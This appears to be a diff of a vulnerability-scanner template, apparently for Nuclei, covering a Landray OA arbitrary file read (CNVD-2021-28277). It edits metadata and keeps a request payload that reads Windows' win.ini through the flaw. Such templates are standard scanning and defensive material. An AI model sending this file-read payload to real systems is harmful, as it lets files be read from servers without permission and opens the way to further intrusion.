@@ -1,15 +1,11 @@
-id: CNVD-2021-28277
+id: landray-oa-fileread
 
 info:
-  name: Landray-OA Arbitrary File Download
-  author: pikpikcu,daffainfo
+  name: Landray-OA Fileread
+  author: pikpikcu
   severity: high
-  reference:
-    - https://www.aisoutu.com/a/1432457
-    - https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
-  metadata:
-    fofa-query: app="Landray OA system"
-  tags: landray,lfi,cnvd,cnvd2021
+  reference: https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
+  tags: landray,lfi
 
 requests:
   - raw:
@@ -29,7 +25,6 @@ requests:
 
         var={"body":{"file":"file:///c://windows/win.ini"}}
 
-    stop-at-first-match: true
     matchers-condition: and
     matchers:
 
